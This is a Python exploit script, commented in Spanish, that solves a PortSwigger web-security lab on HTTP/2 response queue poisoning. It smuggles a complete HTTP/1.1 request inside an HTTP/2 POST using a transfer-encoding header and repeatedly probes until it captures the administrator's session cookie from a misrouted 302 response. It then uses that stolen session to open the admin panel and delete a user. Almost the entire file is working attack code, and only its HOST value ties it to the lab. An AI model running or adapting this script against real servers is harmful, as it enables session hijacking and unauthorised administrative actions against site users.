#!/usr/bin/env python3
"""
Response Queue Poisoning via H2.TE  (lab de PortSwigger)
========================================================
https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/
lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

Idea (distinta a la captura de cuerpo de h2_te.py):
  - Colamos una peticion HTTP/1.1 COMPLETA dentro de la peticion HTTP/2.
  - El back-end responde a DOS peticiones donde el front-end solo mando una:
    queda una respuesta "de mas" en la cola  ->  se desincroniza.
  - A partir de ahi, cada respuesta llega al usuario EQUIVOCADO (corrida por 1).
  - El admin hace login cada cierto tiempo. Su respuesta 302 con
    Set-Cookie: session=<admin>  nos llega A NOSOTROS. Esa es la sesion robada.
  - Con esa cookie entramos a /admin y borramos a carlos.

La peticion venenosa (equivalente en Burp):
    POST /x HTTP/2
    Host: <host>
    Transfer-Encoding: chunked

    0
    (linea en blanco)
    GET /x HTTP/1.1
    Host: <host>
    (linea en blanco = \r\n\r\n final, OBLIGATORIO)

Requisito:  pip install h2

Uso:
    python h2_rqp.py
Cambia HOST abajo por el de tu lab.
"""
import socket
import ssl
import time

try:
    import h2.connection
    import h2.config
    import h2.events
except ImportError:
    raise SystemExit("[!] Falta la libreria 'h2'. Instalala con:  pip install h2")

HOST = "0a9200db0407308b81dbca8800070002.web-security-academy.net"   # <-- cambia por tu lab
PORT = 443
TIMEOUT = 8              # segundos por peticion
MAX_INTENTOS = 200       # sondas TOTALES buscando la respuesta 3XX del admin
SONDAS_POR_RONDA = 20    # sondas por ronda antes de re-alinear con un flush
FLUSH_N = 10             # peticiones limpias para drenar/re-alinear la cola
ESPERA = 5               # segundos entre sondas (recomendacion del lab)


def h2_request(host, port, method, path, extra_headers=None, body=None,
               timeout=TIMEOUT):
    """Manda UNA peticion HTTP/2 (con validacion OFF para poder inyectar
    transfer-encoding) y devuelve (status, headers, body_bytes).
    Si `body` es None, la peticion no lleva cuerpo."""
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    # Labs con certificados raros:
    # ctx.check_hostname = False
    # ctx.verify_mode = ssl.CERT_NONE

    sock = socket.create_connection((host, port), timeout=timeout)
    tls = ctx.wrap_socket(sock, server_hostname=host)
    if tls.selected_alpn_protocol() != "h2":
        tls.close()
        raise SystemExit("[!] El server no negocio HTTP/2 (ALPN != h2).")

    config = h2.config.H2Configuration(
        client_side=True,
        header_encoding="utf-8",        # <-- SIN esto las cabeceras llegan como
                                        # bytes y ':status'/'set-cookie' nunca
                                        # coinciden -> status siempre None.
        validate_outbound_headers=False,
        normalize_outbound_headers=False,
        validate_inbound_headers=False,
    )
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    tls.sendall(conn.data_to_send())

    headers = [
        (":method", method),
        (":path", path),
        (":authority", host),
        (":scheme", "https"),
    ]
    if extra_headers:
        headers.extend(extra_headers)

    stream_id = conn.get_next_available_stream_id()
    if body is None:
        conn.send_headers(stream_id, headers, end_stream=True)
        tls.sendall(conn.data_to_send())
    else:
        conn.send_headers(stream_id, headers, end_stream=False)
        conn.send_data(stream_id, body.encode("latin-1"), end_stream=True)
        tls.sendall(conn.data_to_send())

    status = None
    resp_headers = []
    resp_body = b""
    try:
        while True:
            try:
                data = tls.recv(65535)
            except socket.timeout:
                break
            if not data:
                break
            for event in conn.receive_data(data):
                if isinstance(event, h2.events.ResponseReceived):
                    resp_headers = event.headers
                    for name, value in event.headers:
                        if name == ":status":
                            status = value
                elif isinstance(event, h2.events.DataReceived):
                    resp_body += event.data
                    conn.acknowledge_received_data(
                        event.flow_controlled_length, event.stream_id)
                elif isinstance(event, (h2.events.StreamEnded,
                                        h2.events.ConnectionTerminated)):
                    tls.close()
                    return status, resp_headers, resp_body
            out = conn.data_to_send()
            if out:
                tls.sendall(out)
    finally:
        try:
            tls.close()
        except Exception:
            pass
    return status, resp_headers, resp_body


def peticion_venenosa():
    """La peticion HTTP/2 que cuela un GET /x completo y envenena la cola."""
    smuggled = (
        "GET /x HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "\r\n"                       # <-- \r\n\r\n final: OBLIGATORIO
    )
    body = "0\r\n\r\n" + smuggled     # chunk 0 = fin para el back-end (TE)
    extra = [("transfer-encoding", "chunked")]
    return h2_request(HOST, PORT, "POST", "/x", extra, body)


def buscar_cookie_sesion(resp_headers):
    """Devuelve el valor de session=... si hay un Set-Cookie en la respuesta."""
    for name, value in resp_headers:
        if name.lower() == "set-cookie" and "session=" in value:
            # session=XXXX; Secure; HttpOnly...  -> nos quedamos con XXXX
            token = value.split("session=", 1)[1].split(";", 1)[0]
            return token
    return None


def flush(n=FLUSH_N):
    """Manda n peticiones limpias (GET /) para drenar respuestas encoladas y
    re-alinear la cola (ademas da chance a que el server recicle la conexion
    back-end, lo unico que realmente 'des-envenena')."""
    for _ in range(n):
        try:
            h2_request(HOST, PORT, "GET", "/")
        except (socket.timeout, ConnectionError, ssl.SSLError):
            pass


# ---------------------------------------------------------------------------
# FASE 1: envenenar la cola y robar la sesion del admin
# ---------------------------------------------------------------------------
def fase1_robar_sesion():
    print(f"[*] FASE 1: envenenando la cola en {HOST} ...")
    print(f"    (hasta {MAX_INTENTOS} sondas en rondas de {SONDAS_POR_RONDA};"
          f" buscando una respuesta 3XX con Set-Cookie session)\n")
    intentos = 0
    ronda = 0
    while intentos < MAX_INTENTOS:
        ronda += 1
        print(f"[*] Ronda {ronda}: (re)envenenando la cola...")
        for _ in range(SONDAS_POR_RONDA):
            if intentos >= MAX_INTENTOS:
                break
            intentos += 1
            try:
                status, headers, _ = peticion_venenosa()
            except (socket.timeout, ConnectionError, ssl.SSLError) as e:
                print(f"    [{intentos:03d}] error de red ({e}); reintento...")
                time.sleep(ESPERA)
                continue

            token = buscar_cookie_sesion(headers)
            es_3xx = bool(status) and status.startswith("3")
            if token and es_3xx:
                marca = f"  <== 3XX + Set-Cookie session={token}"
            elif token:
                marca = f"  (session={token} pero status {status}, no 3XX; ignoro)"
            else:
                marca = ""
            print(f"    [{intentos:03d}] status {status}{marca}")

            # Solo aceptamos la sesion si viene en una respuesta 3XX (el 302 del
            # login del admin). Un 200 con session = cookie anonima -> falso positivo.
            if token and es_3xx:
                print(f"\n[+] SESION DEL ADMIN CAPTURADA: {token}\n")
                return token

            time.sleep(ESPERA)

        # Ronda sin exito -> flush de peticiones limpias y volver a empezar.
        if intentos < MAX_INTENTOS:
            print(f"[*] Sin 3XX en esta ronda; flush de {FLUSH_N} peticiones"
                  f" limpias para re-alinear, y re-envenenamos...\n")
            flush()

    print(f"\n[-] No se capturo la sesion tras {MAX_INTENTOS} sondas. Reintenta"
          " (el admin loguea cada cierto tiempo).")
    return None


# ---------------------------------------------------------------------------
# FASE 2 y 3: entrar a /admin con la cookie robada y borrar a carlos
# ---------------------------------------------------------------------------
def fase2_borrar_carlos(session):
    cookie = [("cookie", f"session={session}")]

    print("[*] FASE 2: accediendo a /admin (reintentos por la cola envenenada)...")
    for i in range(1, 21):
        status, _, body = h2_request(HOST, PORT, "GET", "/admin", cookie)
        txt = body.decode("latin-1", errors="replace")
        if status == "200" and ("admin" in txt.lower() and "carlos" in txt.lower()):
            print(f"    [{i:02d}] status 200 -> panel de admin accesible.")
            break
        print(f"    [{i:02d}] status {status} (aun no); reintento...")
        time.sleep(1)
    else:
        print("[-] No se pudo abrir /admin. Reintenta la FASE 1 (sesion caducada?).")
        return

    print("\n[*] FASE 3: borrando a carlos...")
    for i in range(1, 21):
        status, _, body = h2_request(
            HOST, PORT, "GET", "/admin/delete?username=carlos", cookie)
        txt = body.decode("latin-1", errors="replace")
        print(f"    [{i:02d}] status {status}")
        if status in ("200", "302") and "carlos" not in txt.lower():
            print("\n[+] carlos deberia estar borrado. Revisa el lab (Solved).")
            return
        time.sleep(1)
    print("\n[!] Si no salio, prueba a mano: puede requerir POST /admin/delete con"
          " csrf token (mira el HTML de /admin).")


if __name__ == "__main__":
    session = fase1_robar_sesion()
    if session:
        fase2_borrar_carlos(session)
